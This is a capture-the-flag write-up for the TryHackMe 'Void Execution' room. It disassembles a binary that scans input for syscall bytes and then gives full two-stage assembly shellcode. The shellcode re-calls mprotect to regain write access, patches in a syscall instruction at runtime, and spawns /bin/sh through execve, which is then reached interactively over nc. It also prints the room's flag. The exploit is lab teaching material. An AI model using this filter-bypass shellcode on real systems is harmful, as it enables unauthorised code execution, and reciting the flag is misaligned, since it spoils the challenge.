# [TryHackMe | Void Execution](https://tryhackme.com/room/hfb1voidexecution) Challenge Room Solution Writeup

## Necessary Background Information

Before approaching this challenge, there are some useful technical details to familiarize ourselves with. 

### x86-64 Registers and Calling Conventions

The x86-64 architecture provides several general-purpose registers that can be accessed at different widths. The full registers are 64 bits wide and are conventionally named with an `R` prefix, while their lower 32-bit portions use an `E` prefix. The lower 16- and 8-bit portions can also be accessed independently. For example, `RAX`, `EAX`, `AX`, and `AL` refer to progressively smaller portions of the same physical register.

The roles of these registers depend on the context in which they are used. Three layers are relevant here:

1. **x86-64 CPU:** Defines the registers and instructions such as `call`, `ret`, and `syscall`.

2. **System V AMD64 ABI:** Defines how ordinary function calls are made on Linux x86-64, including how arguments are passed through registers.

3. **Linux x86-64 syscall ABI:** Defines how arguments are passed from user space to the Linux kernel when using the `syscall` instruction.

| 8-bit | 16-bit | 32-bit | 64-bit | CPU / General Role | System V AMD64 — C Function | Linux x86-64 — Syscall |
|---|---|---|---|---|---|---|
| `AL` | `AX` | `EAX` | `RAX` | General-purpose; return value | Return value | **Syscall number**; return value |
| `BL` | `BX` | `EBX` | `RBX` | General-purpose | Callee-saved | — |
| `CL` | `CX` | `ECX` | `RCX` | General-purpose | **4th argument**; caller-saved | **Clobbered by `syscall`** |
| `DL` | `DX` | `EDX` | `RDX` | General-purpose | **3rd argument**; caller-saved | **3rd argument** |
| `SIL` | `SI` | `ESI` | `RSI` | General-purpose | **2nd argument**; caller-saved | **2nd argument** |
| `DIL` | `DI` | `EDI` | `RDI` | General-purpose | **1st argument**; caller-saved | **1st argument** |
| `BPL` | `BP` | `EBP` | `RBP` | Frame/base pointer | Callee-saved; commonly used as frame pointer | — |
| `SPL` | `SP` | `ESP` | `RSP` | **Stack pointer** | Stack pointer | Stack pointer |
| — | — | `R8D` | `R8` | General-purpose | **5th argument**; caller-saved | **5th argument** |
| — | — | `R9D` | `R9` | General-purpose | **6th argument**; caller-saved | **6th argument** |
| — | — | `R10D` | `R10` | General-purpose | Caller-saved | **4th argument** |
| — | — | `R11D` | `R11` | General-purpose | Caller-saved | **Clobbered by `syscall`** |
| — | — | `R12D` | `R12` | General-purpose | Callee-saved | — |
| — | — | `R13D` | `R13` | General-purpose | Callee-saved | — |
| — | — | `R14D` | `R14` | General-purpose | Callee-saved | — |
| — | — | `R15D` | `R15` | General-purpose | Callee-saved | — |

For ordinary C functions, the first six integer or pointer arguments are passed in `RDI`, `RSI`, `RDX`, `RCX`, `R8`, and `R9`, respectively. The return value is normally placed in `RAX`. For Linux system calls, the first six arguments are passed in `RDI`, `RSI`, `RDX`, `R10`, `R8`, and `R9`, respectively, while `RAX` contains the syscall number. Thus, the fourth argument differs between the two conventions: C functions use `RCX`, whereas Linux system calls use `R10`. The `syscall` instruction itself is an x86-64 CPU instruction. When executed by a Linux user-space program, it invokes the Linux kernel according to the Linux syscall ABI. The `syscall` instruction clobbers `RCX` and `R11`, so their values cannot be relied upon after the instruction.

### Additional Register

| Register | CPU / General Role | System V AMD64 — C Function | Linux x86-64 — Syscall |
|---|---|---|---|
| `RIP` | **Instruction pointer** — address of the next instruction to execute | Modified by `call`/`ret` and control-flow instructions | Modified as part of the transition caused by `syscall` |

## Vulnerability Analysis

First download and unzip the relevant files from the supplied [link](https://drive.google.com/file/d/1GNGIBBvVgK3j_5owjXFueTvIk4ZceIpJ/view).

```bash
wget https://drive.google.com/uc?id=1GNGIBBvVgK3j_5owjXFueTvIk4ZceIpJ -O void.zip;
unzip void.zip
```

Then disassemble `voidexec` to identify the relevant functions and control flow.

```bash
objdump -d voidexec 

voidexec:     file format elf64-x86-64

...

Disassembly of section .text:

...

0000000000001250 <forbidden>:
    1250:	f3 0f 1e fa          	endbr64
    1254:	55                   	push   %rbp
    1255:	48 89 e5             	mov    %rsp,%rbp
    1258:	48 83 ec 20          	sub    $0x20,%rsp
    125c:	48 89 7d e8          	mov    %rdi,-0x18(%rbp)
    1260:	48 8b 45 e8          	mov    -0x18(%rbp),%rax
    1264:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    1268:	48 c7 45 f0 00 00 00 	movq   $0x0,-0x10(%rbp)
    126f:	00 
    1270:	eb 6b                	jmp    12dd <forbidden+0x8d>
    1272:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    1276:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    127a:	48 01 d0             	add    %rdx,%rax
    127d:	0f b6 00             	movzbl (%rax),%eax
    1280:	3c 0f                	cmp    $0xf,%al
    1282:	75 16                	jne    129a <forbidden+0x4a>
    1284:	48 8d 05 79 0d 00 00 	lea    0xd79(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    128b:	48 89 c7             	mov    %rax,%rdi
    128e:	e8 1d fe ff ff       	call   10b0 <puts@plt>
    1293:	b8 01 00 00 00       	mov    $0x1,%eax
    1298:	eb 4f                	jmp    12e9 <forbidden+0x99>
    129a:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    129e:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    12a2:	48 01 d0             	add    %rdx,%rax
    12a5:	0f b6 00             	movzbl (%rax),%eax
    12a8:	3c cd                	cmp    $0xcd,%al
    12aa:	75 2c                	jne    12d8 <forbidden+0x88>
    12ac:	48 8b 45 f0          	mov    -0x10(%rbp),%rax
    12b0:	48 8d 50 01          	lea    0x1(%rax),%rdx
    12b4:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    12b8:	48 01 d0             	add    %rdx,%rax
    12bb:	0f b6 00             	movzbl (%rax),%eax
    12be:	3c 80                	cmp    $0x80,%al
    12c0:	75 16                	jne    12d8 <forbidden+0x88>
    12c2:	48 8d 05 3b 0d 00 00 	lea    0xd3b(%rip),%rax        # 2004 <_IO_stdin_used+0x4>
    12c9:	48 89 c7             	mov    %rax,%rdi
    12cc:	e8 df fd ff ff       	call   10b0 <puts@plt>
    12d1:	b8 01 00 00 00       	mov    $0x1,%eax
    12d6:	eb 11                	jmp    12e9 <forbidden+0x99>
    12d8:	48 83 45 f0 01       	addq   $0x1,-0x10(%rbp)
    12dd:	48 83 7d f0 62       	cmpq   $0x62,-0x10(%rbp)
    12e2:	76 8e                	jbe    1272 <forbidden+0x22>
    12e4:	b8 00 00 00 00       	mov    $0x0,%eax
    12e9:	c9                   	leave
    12ea:	c3                   	ret

00000000000012eb <main>:
    12eb:	f3 0f 1e fa          	endbr64
    12ef:	55                   	push   %rbp
    12f0:	48 89 e5             	mov    %rsp,%rbp
    12f3:	48 83 ec 10          	sub    $0x10,%rsp
    12f7:	b8 00 00 00 00       	mov    $0x0,%eax
    12fc:	e8 08 ff ff ff       	call   1209 <setup>
    1301:	41 b9 00 00 00 00    	mov    $0x0,%r9d
    1307:	41 b8 ff ff ff ff    	mov    $0xffffffff,%r8d
    130d:	b9 22 00 00 00       	mov    $0x22,%ecx
    1312:	ba 07 00 00 00       	mov    $0x7,%edx
    1317:	be 64 00 00 00       	mov    $0x64,%esi
    131c:	b8 00 00 de c0       	mov    $0xc0de0000,%eax
    1321:	48 89 c7             	mov    %rax,%rdi
    1324:	e8 97 fd ff ff       	call   10c0 <mmap@plt>
    1329:	48 89 45 f8          	mov    %rax,-0x8(%rbp)
    132d:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1331:	ba 64 00 00 00       	mov    $0x64,%edx
    1336:	be 00 00 00 00       	mov    $0x0,%esi
    133b:	48 89 c7             	mov    %rax,%rdi
    133e:	e8 8d fd ff ff       	call   10d0 <memset@plt>
    1343:	48 8d 05 c5 0c 00 00 	lea    0xcc5(%rip),%rax        # 200f <_IO_stdin_used+0xf>
    134a:	48 89 c7             	mov    %rax,%rdi
    134d:	e8 5e fd ff ff       	call   10b0 <puts@plt>
    1352:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1356:	ba 64 00 00 00       	mov    $0x64,%edx
    135b:	48 89 c6             	mov    %rax,%rsi
    135e:	bf 00 00 00 00       	mov    $0x0,%edi
    1363:	e8 78 fd ff ff       	call   10e0 <read@plt>
    1368:	48 8d 05 ba 0c 00 00 	lea    0xcba(%rip),%rax        # 2029 <_IO_stdin_used+0x29>
    136f:	48 89 c7             	mov    %rax,%rdi
    1372:	e8 39 fd ff ff       	call   10b0 <puts@plt>
    1377:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    137b:	48 89 c7             	mov    %rax,%rdi
    137e:	e8 cd fe ff ff       	call   1250 <forbidden>
    1383:	84 c0                	test   %al,%al
    1385:	74 0a                	je     1391 <main+0xa6>
    1387:	bf 01 00 00 00       	mov    $0x1,%edi
    138c:	e8 7f fd ff ff       	call   1110 <exit@plt>
    1391:	48 8b 45 f8          	mov    -0x8(%rbp),%rax
    1395:	ba 04 00 00 00       	mov    $0x4,%edx
    139a:	be 64 00 00 00       	mov    $0x64,%esi
    139f:	48 89 c7             	mov    %rax,%rdi
    13a2:	e8 59 fd ff ff       	call   1100 <mprotect@plt>
    13a7:	48 8b 55 f8          	mov    -0x8(%rbp),%rdx
    13ab:	b8 00 00 00 00       	mov    $0x0,%eax
    13b0:	ff d2                	call   *%rdx
    13b2:	b8 00 00 00 00       	mov    $0x0,%eax
    13b7:	c9                   	leave
    13b8:	c3                   	ret

...
```

Based on the above printout, we can dissect both ```0000000000001250 <forbidden>``` and ```00000000000012eb <main>``` to understand how they function and in turn, how they may be exploited:

1. Lines ```12eb-12fc``` establish the ```main()``` stack frame and call
```setup()```, with ```%eax``` initialized to ```0x0```.

2. Lines ```1301-1324``` call
    ```bash
    mmap(
        addr=0xc0de0000, # %rdi <- %rax <- %eax <- $0xc0de0000
        length=100, # %rsi <- %esi <- $0x64
        prot=7, # %rdx <- %edx <- $0x7 where RWX:0x7 = PROT_READ:0x1 + PROT_WRITE:0x2 + PROT_EXEC:0x4
        flags=0x22, # %rcx <- %ecx <- $0x22 where 0x22 = 0x02:MAP_PRIVATE + 0x20:MAP_ANONYMOUS
        fd=-1, # %r8 <- %r8d <- $0xffffffff, whose 32-bit two's-complement representation is -1
        offset=0 # %r9 <- %r9d <- $0x0
    )
    ```
    which requests an anonymous, private memory mapping of 100 bytes with read, write, and execute permissions. It suggests ```0xc0de0000``` as the starting address, although this is only a hint because ```MAP_FIXED``` is not specified. Since the mapping is anonymous, no file is associated with it, hence the file descriptor of ```-1``` and offset of ```0```.

3. Lines ```1329-133e``` call
    ```bash
    memset(
        s=<value stored at -0x8(%rbp)>, # %rdi <- %rax <- -0x8(%rbp) <- mmap() return value
        c=0x0, # %rsi <- %esi <- $0x0
        n=100 # %rdx <- %edx <- $0x64
    )
    ```
    which initializes the 100-byte memory region whose address is stored at ```-0x8(%rbp)``` to ```0x0```.

4. Lines ```1352-1363``` call
    ```bash
    read(
        fd=0, # %rdi <- %edi <- $0x0 = stdin
        buf=<value stored at -0x8(%rbp)>, # %rsi <- %rax <- -0x8(%rbp) <- mmap() return value
        count=100 # %rdx <- %edx <- $0x64
    )
    ```
    which reads up to 100 bytes from standard input into the memory region whose address is stored at `-0x8(%rbp)`. This is therefore where our payload is written.

5. Lines `1377-137e` call
    ```bash
    forbidden(
        s=<value stored at -0x8(%rbp)> # %rdi <- %rax <- -0x8(%rbp) <- mmap() return value
    )
    ```
    which passes the address of our payload to `forbidden()`.
    `forbidden()` then uses this address to inspect the bytes stored
    in the mapped memory region. 
    
    Before continuing, we must first dissect the `forbidden()` function:

    - Lines `1250-1264` establish the stack frame and preserve the input pointer passed in `%rdi`. The pointer is stored at `-0x18(%rbp)` and then copied to `-0x8(%rbp)`, giving the relationship `%rdi → -0x18(%rbp) → %rax → -0x8(%rbp)`, where the value stored at `-0x8(%rbp)` is the address of our input buffer. 
    
    - Lines `1268-1270` initialize the loop counter at `-0x10(%rbp)` to `0x0` and jump to `12dd`, where the loop condition is checked against `0x62 (98)`.

    - Lines `1272-1298` calculate the address of the current input byte by adding the buffer address to the loop counter, read the byte, and compare it against `0x0f`. If the byte equals `0x0f`, the function prints the forbidden-input message, sets `%eax = 0x1`, and returns.

    - Lines `129a-12d6` perform a second check for the byte sequence `0xcd 0x80`. If the current byte is `0xcd`, the following byte is checked for `0x80`. If both match, the function again sets `%eax = 0x1` and returns.

    - **These patterns correspond to x86 instructions used to transition from user space into the Linux kernel to request system calls. `0x0f` is an opcode escape byte used by many instructions, including `0x0f 0x05` (`syscall`), while `0xcd 0x80` encodes `int 0x80`, another instruction used to invoke Linux system calls. Thus, checking for `0x0f` blocks `syscall` as well as other instructions using the `0x0f` opcode space, while checking for `0xcd 0x80` blocks the `int 0x80` mechanism.**

    - Lines `12d8-12e2` increment the counter and repeat the loop while it is less than or equal to `0x62` (`98`). Since the counter starts at `0x0`, `forbidden()` therefore inspects offsets `0` through `98`, for a total of 99 bytes. Although `read()` accepts up to 100 bytes, the final byte is not inspected by `forbidden()`. This distinction is not required for our payload.

    - Lines `12e4-12ea` set `%eax = 0x0` and return if no forbidden pattern is found.

    - **In summary, `forbidden()` scans the first 99 bytes of the input buffer for `0x0f` or the sequence `0xcd 0x80`, returning `0x1` if either is found and `0x0` otherwise.**

6. Lines `1383-138c` test the return value of `forbidden()` and
terminate the program if a forbidden pattern was detected.

7. Lines `1391-13a2` call
    ```bash
    mprotect(
        addr=<value stored at -0x8(%rbp)>, # %rdi <- %rax <- -0x8(%rbp) <- mmap() return value
        len=100, # %rsi <- %esi <- $0x64
        prot=4 # %rdx <- %edx <- $0x4 where PROT_EXEC:0x4
    )
    ```
    which changes the protection of the 100-byte memory mapping from
    `RWX` to executable-only (`PROT_EXEC`). **Would be nice if we could get `RWX` back ...**

8. Lines `13a7-13b0` transfer execution to the input buffer by loading its address into `%rdx` and performing **`call *%rdx`; this may be used as a reference address!** 

9. Lines `13b2-13b8` then set the return value to `0`, restore the stack frame, and return from `main()`.

## Payload Construction

To construct the payload, we will use a two-stage system:

1. **First Invocation:** Ensure that `forbidden()` sees only benign bytes, allowing execution to proceed past the filter. We continue through `main()` until the call to `*%rdx` on line `13b0`, which provides a reference address that we can step back from to re-call `mprotect()` on line `13a2` of `main()`, giving the buffer `RWX` privileges. This works because `forbidden()` scans the buffer's bytes before execution and does not prohibit the instruction bytes required to construct the `mprotect()` arguments. Execution then continues to the end of `main()`, where the buffer is invoked a second time. 

2. **Second Invocation:** With the buffer now `RWX`, we can modify it at runtime to construct the previously forbidden `0x0f 0x05` sequence and execute it as a `syscall`, allowing us to invoke `execve` and spawn a shell.

```bash
.section .text
.globl _start

_start:
    # ----------------
    # First invocation
    # ----------------

    # check whether this is the second invocation and if not, mark it as the first
    cmp $0x01, %rbx
    je shell
    mov $0x01, %rbx

    # set arguments for mprotect(addr, len, prot)
    mov %rdx, %rdi     # addr = buffer
    mov $0x64, %esi    # len = 100
    mov $0x07, %edx    # prot = PROT_READ | PROT_WRITE | PROT_EXEC

    # recover the return address pushed by call *%rdx, then step back 0x10 bytes to reach the mprotect() call in main()
    pop %r10
    sub $0x10, %r10
    jmp *%r10

shell:
    # -----------------
    # Second invocation
    # -----------------

    # with the buffer now RWX, construct the forbidden 0x0f 0x05 ("syscall") instruction at runtime, bypassing forbidden()'s byte check
    mov $0x0e, %al
    add $0x01, %al
    mov $0x05, %ah

    # replace the existing benign bytes in syscall_instruction with 0x0f 0x05
    lea syscall_instruction(%rip), %r10
    mov %ax, (%r10)

    # prepare execve(pathname, argv, envp) and execute
    lea binsh(%rip), %rdi    # pathname = "/bin/sh"
    xor %esi, %esi           # argv = NULL
    xor %edx, %edx           # envp = NULL
    mov $0x3B, %eax          # Linux x86-64 syscall number for execve
    jmp syscall_instruction

# initially benign bytes; replaced with 0x0f 0x05 at runtime after forbidden() scan
syscall_instruction:
    .byte 0x00, 0x00

# null-terminated "/bin/sh" string used by execve()
binsh:
    .ascii "/bin/sh"
    .byte 0x00
```

## Execution

Write and save the payload to a file with `nano payload.s`, assemble it with `as -o payload.o payload.s`, and then use `objcopy -O binary -j .text payload.o payload.bin` to extract the raw `.text` section into a binary file. Finally, run `(cat payload.bin; cat) | nc VOIDEXEC_HOST_IP 9008` to send the payload to `voidexec`. The second `cat` keeps standard input attached to the connection, allowing us to enter commands interactively&mdash;such as `ls` and `cat flag.txt`&mdash;after the payload exploits the vulnerability and spawns a shell. Once in, you'll discover the flag's contents to be **THM{a_void_in_the_memory_c0de}**.